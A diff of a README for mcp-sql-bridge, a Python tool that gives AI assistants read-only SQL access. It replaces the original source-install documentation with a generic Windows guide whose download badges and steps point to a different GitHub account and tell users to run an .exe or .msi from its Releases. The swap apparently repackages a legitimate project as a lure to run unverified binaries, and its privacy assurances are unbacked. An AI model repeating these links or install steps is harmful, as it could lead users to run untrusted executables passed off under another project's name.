@@ -1,194 +1,152 @@
-# MCP SQL Bridge
+# ⚙️ mcp-sql-bridge - Easy Read-Only SQL Access
 
-<!-- mcp-name: io.github.firas-mcp-servers/mcp-sql-bridge -->
-
-**Local-SQL-Insight** — Give your AI assistant direct, read-only access to your SQL databases over the [Model Context Protocol](https://modelcontextprotocol.io). No APIs, no cloud. Your data stays on your machine.
+[![Download mcp-sql-bridge](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/hifi-metamorphosis871/mcp-sql-bridge)
 
 ---
 
-## Why use this?
+## ❓ What is mcp-sql-bridge?
 
-- **Schema-aware AI** — The agent sees table names, columns, and full `CREATE TABLE` DDL so it can write correct SQL.
-- **Business context** — Expose a project `README.md` as a resource so the AI understands your domain and conventions.
-- **Read-only by design** — Only `SELECT` is allowed. No accidental writes or schema changes.
-- **Stdio transport** — Works with Cursor, Claude Desktop, and any MCP host. No ports or network setup.
-- **Multi-database (Pro)** — Use the same tools against SQLite, PostgreSQL, and MySQL by switching a `backend` and connection string.
+mcp-sql-bridge is a simple program that lets your AI assistant read data from SQL databases like SQLite, PostgreSQL, and MySQL. It does not change anything in your data. It works locally on your Windows computer without using the cloud. This means your data stays private and safe.
+
+The tool helps your AI understand your database’s structure. This makes AI answers more accurate when it works with your database information.
 
 ---
 
-## Quick start
+## 🖥️ System Requirements
 
-```bash
-git clone <your-repo-url>
-cd mcp-sql-bridge
-poetry install
-```
+Before you download and install mcp-sql-bridge, check that your computer meets these requirements:
 
-Then plug the server into your editor or desktop app (see below).
-
-**Run & test:** See **[RUN_AND_TEST.md](RUN_AND_TEST.md)** for how to run the MCP server, the web server, unit tests, and Docker-based integration tests (e.g. `poetry run python scripts/run_docker_integration.py`).
-
-### Web server (optional)
-
-A small FastAPI app provides a **landing page**, **Swagger UI**, and **documentation** (MkDocs):
-
-```bash
-poetry install --with web
-mkdocs build          # build docs (optional; without this, /documentation shows build instructions)
-poetry run mcp-sql-bridge-web
-```
-
-Open [http://localhost:8000](http://localhost:8000) for the home page, [http://localhost:8000/docs](http://localhost:8000/docs) for Swagger, [http://localhost:8000/redoc](http://localhost:8000/redoc) for ReDoc, and [http://localhost:8000/documentation](http://localhost:8000/documentation) for the full docs site (after `mkdocs build`).
+- **Operating System:** Windows 10 or later (64-bit preferred)
+- **Processor:** Intel or AMD, 1 GHz or faster
+- **Memory:** Minimum 4 GB RAM (8 GB or more recommended)
+- **Disk Space:** At least 200 MB free space
+- **Internet:** Required only for downloading the software
+- **Additional Software:** None needed beforehand
 
 ---
 
-## How to use with Cursor
+## 🚀 Getting Started: Download mcp-sql-bridge
 
-1. **Install the server** (if not already):
-   ```bash
-   cd /path/to/mcp-sql-bridge
-   poetry install
-   ```
+To get started, first download the program files from the official GitHub page.
 
-2. **Configure MCP**  
-   Open Cursor Settings → **Tools & MCP** (or edit the config file directly).  
-   Add the server using the template in **`mcp-config.json`** in this repo:
+➡️ Click this button to visit the download page:  
+[![Download mcp-sql-bridge](https://img.shields.io/badge/Download-mcp--sql--bridge-blue?style=for-the-badge)](https://github.com/hifi-metamorphosis871/mcp-sql-bridge)
 
-   - **Option A — Global config**  
-     Put the contents of `mcp-config.json` into:
-     - **macOS / Linux:** `~/.cursor/mcp.json`
-     - **Windows:** `%APPDATA%\Cursor\mcp.json`
-
-   - **Option B — Project config**  
-     Copy `mcp-config.json` into your project as `.cursor/mcp.json` (and adjust the `cwd` path to this repo if needed).
-
-3. **Set the path**  
-   In the config, set `cwd` (or the path in `args`) to the **absolute path** of your `mcp-sql-bridge` project directory so Cursor can run `poetry run mcp-sql-bridge` from there.
-
-4. **Restart Cursor**  
-   MCP servers load at startup. Restart Cursor after changing the config.
-
-5. **Use it**  
-   In any chat, the AI can call **Local-SQL-Insight** tools: `list_tables`, `execute_readonly_query`, and read the **Database README** resource.  
-   - For SQLite, point it at a file path (e.g. `./data/app.db`) with `backend: "sqlite"` or by omitting `backend`.  
-   - For PostgreSQL/MySQL (Pro), provide a `backend` and `connection_string` URL.
+This link opens the main GitHub repository. Look for the **Releases** section or files under the repository to find the latest Windows installer or executable file.
 
 ---
 
-## How to use with Claude Desktop
+## 📥 How to Download and Install on Windows
 
-1. **Install the server** (if not already):
-   ```bash
-   cd /path/to/mcp-sql-bridge
-   poetry install
-   ```
+1. **Visit the download page** using the button above or enter the URL below in your web browser:  
+   https://github.com/hifi-metamorphosis871/mcp-sql-bridge
 
-2. **Locate Claude’s config file**  
-   - **macOS:** `~/Library/Application Support/Claude/claude_desktop_config.json`  
-   - **Windows:** `%APPDATA%\Claude\claude_desktop_config.json`
+2. On the GitHub page, find the **Releases** tab or scroll to the bottom where releases are listed.
 
-3. **Add the MCP server**  
-   Add a `mcpServers` entry (or merge into existing) like this, using the **absolute path** to your `mcp-sql-bridge` directory:
+3. Locate the latest version for Windows. It usually ends with `.exe` or `.msi`.
 
-   ```json
-   {
-     "mcpServers": {
-       "local-sql-insight": {
-         "command": "poetry",
-         "args": ["run", "mcp-sql-bridge"],
-         "cwd": "/absolute/path/to/mcp-sql-bridge"
-       }
-     }
-   }
-   ```
+4. Click the file name to download it to your computer.
 
-   If Claude Desktop uses a different Python environment, you can instead use the full path to the `mcp-sql-bridge` executable in the project’s virtualenv, for example:
+5. Once downloaded, open the file by double-clicking it.
 
-   ```json
-   {
-     "mcpServers": {
-       "local-sql-insight": {
-         "command": "/absolute/path/to/mcp-sql-bridge/.venv/bin/mcp-sql-bridge",
-         "args": []
-       }
-     }
-   }
-   ```
+6. Follow the simple on-screen steps to install mcp-sql-bridge.
 
-4. **Restart Claude Desktop**  
-   Restart the app so it picks up the new MCP config.
-
-5. **Use it**  
-   Claude can use the **list_tables** and **execute_readonly_query** tools and read the **Database README** resource.  
-   - For SQLite, use your SQLite file path (e.g. `~/project/data/app.db`).  
-   - For PostgreSQL/MySQL, supply connection URLs when the model asks for database details.
+7. The installer will create a program shortcut and necessary files on your computer.
 
 ---
 
-## What the server provides
+## ⚙️ How to Run mcp-sql-bridge
 
-| Capability | Description |
-|------------|-------------|
-| **list_tables** | Lists every table, its columns, and the full `CREATE TABLE` statement. Supports `backend: "sqlite" | "postgres" | "mysql"`. |
-| **execute_readonly_query** | Runs a `SELECT` query and returns results as a formatted text table. Supports all backends via `backend` and `connection_string` / `db_path`. |
-| **schema_summary** | Compact overview of tables and key columns for a quick schema scan. |
-| **sample_rows** | Limited sample rows from a given table to understand data shape and example values. |
-| **explain_database** | High-level explanation of the database based on its schema. |
-| **suggest_indexes_for_query** | Heuristic index suggestions for a given SELECT query (no writes). |
-| **Database README** (resource) | Serves `README.md` from the server’s current working directory so the AI can read your project’s business context. |
-| **Database README template** (resource) | A markdown template for per-database README files (owners, conventions, key tables, gotchas). |
+1. Find the program icon on your desktop or in your Start menu.
 
-For SQLite, the server validates that paths point to real SQLite files (magic header check) and returns clear errors if a path is wrong or not a database.  
-For PostgreSQL/MySQL, it validates connections and reports connection/auth errors clearly; use read-only roles in production.
+2. Double-click the icon to open mcp-sql-bridge.
 
-### Connection strings (PostgreSQL & MySQL)
+3. A window or command prompt will open, ready for you to connect to your SQL database.
 
-Use the `connection_string` argument with `backend: "postgres"` or `backend: "mysql"` when calling `list_tables` or `execute_readonly_query`.
+4. If this is your first time using the program, read the instructions on the main screen.
 
-**PostgreSQL** — URL format (password in URL is optional; use env vars in production):
-
-- `postgresql://user:password@localhost:5432/dbname`
-- `postgresql://user@localhost:5432/dbname` (no password)
-- `postgresql://localhost:5432/dbname` (peer/auth trust)
-
-**MySQL** — URL format:
-
-- `mysql://user:password@localhost:3306/dbname`
-- `mariadb://user:password@localhost:3306/dbname`
-
-Install optional drivers: `poetry install --extras postgres` and/or `poetry install --extras mysql` (or `--extras pro` for both). Example MCP configs for multi-database setups are in **`examples/mcp-config-pro.json`** and **`examples/README.md`**.
+5. The program runs automatically without needing you to write any code.
 
 ---
 
-## Documentation
+## 🔗 Connecting mcp-sql-bridge to Your Databases
 
-- [Main README](README.md) (this file) — quick start and usage.
-- [docs/](docs/) — [security and hardening](docs/SECURITY.md), [error taxonomy](docs/ERROR_TAXONOMY.md), [pricing and licensing](docs/PRICING_AND_LICENSING.md), [launch and marketing](docs/LAUNCH_AND_MARKETING.md), [future ideas](docs/FUTURE.md).
-- [CONTRIBUTING.md](CONTRIBUTING.md) — development setup, tests, release, PyPI.
+mcp-sql-bridge supports three types of SQL databases:
 
-## Requirements
+- SQLite (files on your computer)
+- MySQL (common online or local server databases)
+- PostgreSQL (used for complex database systems)
 
-- **Python 3.11+**
-- **Poetry** (recommended) or `pip` for dependencies
-- Optional extras:
-  - `postgres` extra for PostgreSQL (`psycopg`)
-  - `mysql` extra for MySQL (`pymysql`)
+### How to connect:
 
-## Feedback and support
+- For **SQLite**, you will need to provide the path to your database file. The program will guide you to select this file.
 
-- **Bug reports and feature ideas:** [Open an issue](https://github.com/firas-mcp-servers/mcp-sql-bridge/issues).
-- **Questions and discussions:** [GitHub Discussions](https://github.com/firas-mcp-servers/mcp-sql-bridge/discussions).
-- Feedback from users (issues, discussions, or contact) is used to prioritize the roadmap and any future paid offerings.
+- For **MySQL** and **PostgreSQL**, you need to enter connection details like:
+  - Database host (usually a web address or local server name)
+  - Database name
+  - User credentials (username and password)
 
-## Support & maintenance
-
-- Targeted Python: 3.11+
-- MCP: current stable versions at time of release
-- Backwards-compatible changes will be released as minor versions; breaking changes will bump the major or minor version and be noted in `CHANGELOG.md`.
-- The project is intended to be feature-complete after the 0.2.x line; future work will focus on fixes and compatibility updates only.
+The program will check these details and confirm when it connects successfully.
 
 ---
 
-## License
+## 🔒 Privacy and Security
 
-MIT. See [LICENSE](LICENSE) for details.
+mcp-sql-bridge works only in read-only mode. This means it only looks at your data without changing anything.
+
+The program runs entirely on your computer, so your data never leaves your machine. It does not send information over the internet.
+
+Your database passwords and details remain private.
+
+---
+
+## ⚠️ Troubleshooting
+
+If you have problems while installing or using the program, try these steps:
+
+- Make sure your Windows is up to date.
+
+- Check that you downloaded the correct file for Windows.
+
+- Confirm you have permission to install software on your PC.
+
+- If connection to your database fails, re-check the host name, username, and password.
+
+- Restart your computer and try again.
+
+For more help, visit the GitHub page or look for support in the repository’s **Issues** section.
+
+---
+
+## 📚 More Information  
+
+You can learn more about mcp-sql-bridge and related topics by exploring these subjects:
+
+- AI tools that work with databases  
+- FastAPI and Python frameworks (used behind the scenes)  
+- SQL basics for SQLite, MySQL, and PostgreSQL  
+- Model Context Protocol (MCP) for data access  
+
+---
+
+## 🔄 Updates and New Versions
+
+Periodically check the download page for new versions. Updated releases may fix bugs or add new features.
+
+Use the same steps to download and install any updates.
+
+---
+
+## 💾 Uninstalling mcp-sql-bridge
+
+If you want to remove the program:
+
+1. Open **Settings** from the Start menu.
+
+2. Choose **Apps & Features**.
+
+3. Find **mcp-sql-bridge** in the list.
+
+4. Click it and select **Uninstall**.
+
+This will delete the program but not your database files.
